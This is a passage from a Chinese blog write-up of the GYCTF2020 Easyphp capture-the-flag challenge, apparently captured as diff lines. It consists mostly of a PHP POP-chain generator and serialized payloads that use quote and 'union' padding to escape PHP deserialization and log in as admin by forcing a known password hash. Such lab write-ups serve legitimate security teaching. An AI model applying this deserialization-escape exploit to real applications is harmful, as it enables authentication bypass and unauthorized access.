class="line">age=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionload1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:9:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;s:4:&quot;feng&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:9:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;s:4:&quot;feng&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">第二次反序列化就同理了：</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age = &quot;1&quot;;</span><br><span class="line">        $this-&gt;nickname = &quot;2&quot;;</span><br><span class="line">        //$this-&gt;CtrlCase=new dbCtrl();</span><br><span class="line">        //$this-&gt;CtrlCase=new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id=&quot;1&quot;;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age=&#x27;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">        $this-&gt;nickname=new Info();</span><br><span class="line">        //$this-&gt;nickname-&gt;CtrlCase=new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;root&quot;;</span><br><span class="line">    public $dbpass=&quot;root&quot;;</span><br><span class="line">    public $database=&quot;test&quot;;</span><br><span class="line">    public $name=&quot;admin&quot;;</span><br><span class="line">    public $password=&quot;1&quot;;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line">    public $feng;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;feng=new UpdateHelper();</span><br><span class="line">        //$this-&gt;token=&quot;admin&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Info();</span><br><span class="line">$a-&gt;CtrlCase=new dbCtrl();</span><br><span class="line">$a-&gt;CtrlCase-&gt;feng-&gt;sql=new User();</span><br><span class="line">$a-&gt;CtrlCase-&gt;feng-&gt;sql-&gt;nickname-&gt;CtrlCase=new User();</span><br><span class="line">//var_dump($a-&gt;CtrlCase-&gt;feng-&gt;sql-&gt;nickname);</span><br><span class="line">//var_dump($a);</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">age=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunionunionunionunionunionunionunionload1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:9:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;N;s:4:&quot;feng&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;s:72:&quot;select &quot;1&quot;,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;username=admin&amp;password=1</span><br></pre></td></tr></table></figure>
+
+
+<p>最终成功得到flag：</p>
+<p>最终成功得到flag：</p>
+<p>参考链接：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/114525951">GYCTF2020]Easyphp-CSDN博客</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/08/06/GYCTF2020-Easyphp/">http://odiws.github.io/2024/08/06/GYCTF2020-Easyphp/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># php反序列化</a>
+                    
+                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"># 反序列化字符串逃逸</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/08/07/2018-eating-cms/">2018]eating_cms</a>
+            
+            
+            <a class="next" rel="next" href="/2024/08/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/">[ISITDTU 2019]EasyPHP</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
